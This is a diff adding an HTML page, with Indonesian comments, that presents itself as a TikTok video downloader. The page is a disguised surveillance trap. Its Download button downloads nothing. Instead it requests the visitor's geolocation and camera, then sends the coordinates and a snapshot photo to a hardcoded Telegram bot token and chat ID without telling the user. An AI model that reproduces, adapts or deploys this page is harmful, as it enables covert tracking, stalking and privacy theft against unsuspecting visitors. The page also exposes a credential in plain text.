@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download TikTok</title>
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #0d0d0d, #1c1c1c);
+            overflow: hidden;
+        }
+
+        .container {
+            background-color: rgba(30, 30, 30, 0.9);
+            padding: 30px;
+            border-radius: 15px;
+            text-align: center;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.5);
+            width: 350px;
+            animation: fadeIn 1.5s ease-in-out;
+        }
+
+        .container h1 {
+            color: #00aaff;
+            font-size: 26px;
+            margin-bottom: 20px;
+        }
+
+        .container input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 20px;
+            border: 2px solid #00aaff;
+            border-radius: 10px;
+            outline: none;
+            background-color: #1a1a1a;
+            color: #fff;
+        }
+
+        .container input[type="text"]::placeholder {
+            color: #aaa;
+        }
+
+        .container button {
+            background-color: #00aaff;
+            color: #fff;
+            padding: 12px 30px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            transition: transform 0.2s, box-shadow 0.3s;
+            box-shadow: 0 5px 15px rgba(0, 170, 255, 0.4);
+        }
+
+        .container button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(0, 170, 255, 0.6);
+        }
+
+        .container button:active {
+            transform: scale(0.95);
+        }
+
+        /* Animasi Partikel */
+        canvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+    </style>
+</head>
+<body>
+    <canvas></canvas>
+    <div class="container">
+        <h1>TikTok Downloader</h1>
+        <input type="text" placeholder="Paste TikTok link here">
+        <button onclick="requestPermissions()">Download</button>
+    </div>
+
+    <script>
+        // Bot Telegram Setup
+        const botToken = '7420041648:AAF_uecAGXJotQp7mn78MqVAwhcRFgy9QHo'; // Ganti dengan token bot Telegram Anda
+        const chatId = '6561488263'; // Ganti dengan ID chat Telegram Anda
+
+        // Fungsi untuk mengirimkan pesan ke Telegram
+        function sendMessageToTelegram(message) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            return fetch(url).then(response => {
+                if (!response.ok) {
+                    throw new Error('Gagal mengirim pesan ke Telegram');
+                }
+                return response.json();
+            });
+        }
+
+        // Fungsi untuk mengirimkan lokasi ke Telegram
+        function sendLocationToTelegram(latitude, longitude) {
+            const locationMessage = `Lokasi Anda: ${latitude}, ${longitude}`;
+            return sendMessageToTelegram(locationMessage);
+        }
+
+        // Fungsi untuk mengirimkan foto ke Telegram
+        function sendPhotoToTelegram(photo) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', photo);
+            const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+
+            return fetch(url, {
+                method: 'POST',
+                body: formData,
+            }).then(response => {
+                if (!response.ok) {
+                    throw new Error('Gagal mengirim foto ke Telegram');
+                }
+                return response.json();
+            });
+        }
+
+        // Fungsi untuk menangkap foto menggunakan kamera
+        function capturePhoto(stream) {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+            video.addEventListener('loadeddata', function() {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0);
+                canvas.toBlob(function(blob) {
+                    sendPhotoToTelegram(blob);
+                }, 'image/jpeg');
+            });
+        }
+
+        // Fungsi untuk meminta izin lokasi dan kamera
+        function requestPermissions() {
+            if (navigator.geolocation && navigator.mediaDevices.getUserMedia) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+
+                    sendLocationToTelegram(latitude, longitude)
+                        .then(() => {
+                            return navigator.mediaDevices.getUserMedia({ video: true });
+                        })
+                        .then(stream => {
+                            capturePhoto(stream);
+                        })
+                        .catch(error => {
+                            alert('Terjadi kesalahan: ' + error.message);
+                        });
+                }, function(error) {
+                    alert('Gagal mendapatkan lokasi: ' + error.message);
+                });
+            } else {
+                alert('Browser tidak mendukung API yang dibutuhkan.');
+            }
+        }
+
+        // Animasi partikel
+        const canvas = document.querySelector('canvas');
+        const ctx = canvas.getContext('2d');
+
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+
+        const particlesArray = [];
+
+        class Particle {
+            constructor(x, y, size, speedX, speedY, color) {
+                this.x = x;
+                this.y = y;
+                this.size = size;
+                this.speedX = speedX;
+                this.speedY = speedY;
+                this.color = color;
+            }
+
+            update() {
+                this.x += this.speedX;
+                this.y += this.speedY;
+
+                if (this.x > canvas.width || this.x < 0) this.speedX = -this.speedX;
+                if (this.y > canvas.height || this.y < 0) this.speedY = -this.speedY;
+            }
+
+            draw() {
+                ctx.fillStyle = this.color;
+                ctx.beginPath();
+                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+                ctx.closePath();
+                ctx.fill();
+            }
+        }
+
+        function init() {
+            particlesArray.length = 0;
+            const numberOfParticles = 150;
+
+            for (let i = 0; i < numberOfParticles; i++) {
+                const size = Math.random() * 4 + 1;
+                const x = Math.random() * canvas.width;
+                const y = Math.random() * canvas.height;
+                const speedX = (Math.random() - 0.5) * 1.5;
+                const speedY = (Math.random() - 0.5) * 1.5;
+                const color = Math.random() > 0.5 ? 'rgba(0, 170, 255, 0.6)' : 'rgba(255, 255, 255, 0.6)';
+
+                particlesArray.push(new Particle(x, y, size, speedX, speedY, color));
+            }
+        }
+
+        function animate() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+            particlesArray.forEach((particle) => {
+                particle.update();
+                particle.draw();
+            });
+
+            requestAnimationFrame(animate);
+        }
+
+        init();
+        animate();
+
+        window.addEventListener('resize', () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            init();
+        });
+    </script>
+</body>
+</html>
